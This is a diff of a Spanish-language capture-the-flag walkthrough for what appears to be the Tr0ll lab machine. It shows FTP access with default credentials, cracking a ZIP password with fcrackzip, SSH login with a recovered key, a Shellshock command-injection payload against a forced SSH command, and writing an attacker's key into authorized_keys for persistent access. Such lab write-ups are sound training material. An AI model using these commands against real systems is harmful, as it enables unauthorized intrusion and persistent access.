@@ -27,44 +27,59 @@ base64 -d answer.txt > decoded.txt
 
 <img width="1225" height="235" alt="image" src="https://github.com/user-attachments/assets/7d354bb9-112a-473a-a649-c19578d7f522" />
 
+**A partir de aquí me he guiado por algún documento de ayuda. 😓Y cambién a Kali. Es tontería instalar cada herramienta cuando Kali ya las trae. **
 
+- No se me había ocurrido pensar que podía hacer un FTP e intentar con el usuario Tr0ll/Tr0ll.  
+<img width="553" height="256" alt="image" src="https://github.com/user-attachments/assets/3a929c66-fa20-4282-9cbe-f9acc1d017e2" />  
 
+- Descargo el fichero ZIP lmao.zip y lo descompacto usando la herramienta **fcrackzip**. Kali no la trae así que tengo que instalarla.
+```bash
+sudo apt-get install fcrackzip
+```
+- Utilizo el fichero answers.txt que decodifiqué antes como diccionario.
+```bash
+fcrackzip lmao.zip -D decoded.txt
+```
+<img width="493" height="129" alt="image" src="https://github.com/user-attachments/assets/5be4ed54-3e6f-496a-9bdb-a07e640426a2" />  
 
+- Descompacto el fichero con la contraseña y encuentro que contiene el fichero noob que es una clave pública.
+<img width="531" height="469" alt="image" src="https://github.com/user-attachments/assets/c1055204-d586-4054-bdd6-5c6cce96f03e" />
 
-- Buscando en ExploitDB encuentro un código en Python que permite explotar una vulnerabilidad de 'Username Enumeration' (https://www.exploit-db.com/exploits/45210). Descargo el código pero necesito instalar en mi equipo varios paquetes. Empiezo por enstalar pip3.
+- Intento conectarme via SSH pero pasando esta clave pública en lugar de una contraseña. Tengo que pasar el parámetro PubkeyAcceptedKeyTypes para que me acepte la clave.
+```bash
+ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa -i noob noob@192.168.161.140
+```
+No me deja entrar pero responde. Vamos bien. 
+
+<img width="659" height="128" alt="image" src="https://github.com/user-attachments/assets/ed9f7802-17a8-4156-a218-dc9d25ce50f2" /> 
+
+Si intento conectarme haciendo un verbose veo que hay un *Remote: Forced Command* que suele ser vulnerable a un ataque  Shellshock.
+
+<img width="693" height="291" alt="image" src="https://github.com/user-attachments/assets/e414d7e2-bad6-49ef-b2ed-f6a390af17ce" />
+
+Lo verifico con el siguiente comando. 
+```bash
+ssh noob@192.168.161.140 -o PubkeyAcceptedKeyTypes=+ssh-rsa -i noob '() { :;}; echo Genaro' 
+```
+<img width="798" height="124" alt="image" src="https://github.com/user-attachments/assets/7cd13190-676d-45b3-8fe4-aa84457ce51d" />
+
+- Intento aprovecharme de la vulnerabilidad y veo que he abierto una terminal en la máquina remota.
+<img width="756" height="455" alt="image" src="https://github.com/user-attachments/assets/74394035-daaf-473b-b9e0-a850e07a9876" />
+
+- Quizá podría seguir en esta terminal, pero he visto que podemos añadir una clave pública para que me deje conectarme con una terminal 'de verdad' desde la máquina atacante. Para ello genero un par de claves en la máquina atacante. Indico la longitud 'minima'.
+  
+<img width="884" height="488" alt="image" src="https://github.com/user-attachments/assets/921e6209-c9a8-4a0d-89ac-2fef6c69d199" />
+
+- En la máquina atacada añado la clave a la lista de autorizadas.
 
 ```bash
-sudo apt-get update
-sudo apt-get install python3-pip
-
+echo '*<contenido de nuestro fichero con la clave pública>*' > /home/noob/.ssh/authorized_keys
 ```
+<img width="872" height="118" alt="image" src="https://github.com/user-attachments/assets/c7444108-d3c0-4156-80c6-019a9ba1603f" />
 
-Luego instalo los módulos que me hacen falta. Primero unas librerías que le hacen falta a la instalación de paramiko y el soporte de rust. También incluyo OpenSSL para que me lo actualice.
+- Ahora ya puedo abrir una sesión directamente desde la máquina atacada.
 
-Despues de la instalación de rust es necesario actualizar el entorno.
-
-```bash
-sudo apt-get install pkg-config libffi-dev libssl-dev openssl
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
-source ~/.bashrc
-```
-Nota. En Ubuntu 18 me daba problemas las versiones de los paquetes (de OpenSSL por ejemplo que era sólo la 1.1.1). En Ubuntu 24 me obliga a instalar python-env y a crear un entorno antes de poder instalar paramiko.
-
-```bash
-sudo apt-get install python3.12-venv
-python3 -m venv venv
-source venv/bin/activate
-```
-
-Finalmente instalo paramiko. Aunque hay que instalar una versión anterior para que no dé problemas.
-
-```bash
-pip3 install six setuptools-rust
-pip3 install paramiko #==2.4.1 Si instalo una versión anterior, paramiko choca con Python 3.12
-```
-
-Despues de prueba y error parece que tengo todos los prerrequisitos necesarios. Y parece que se instala ... a pesar del *segmentation fault* que aparece al final.
-<img width="995" height="98" alt="image" src="https://github.com/user-attachments/assets/026e14c1-f2ff-4105-be54-1215934d597a" />
+<img width="690" height="181" alt="image" src="https://github.com/user-attachments/assets/46b664b6-ff27-4ee5-aa1b-38297ef1a624" />
 
 
 
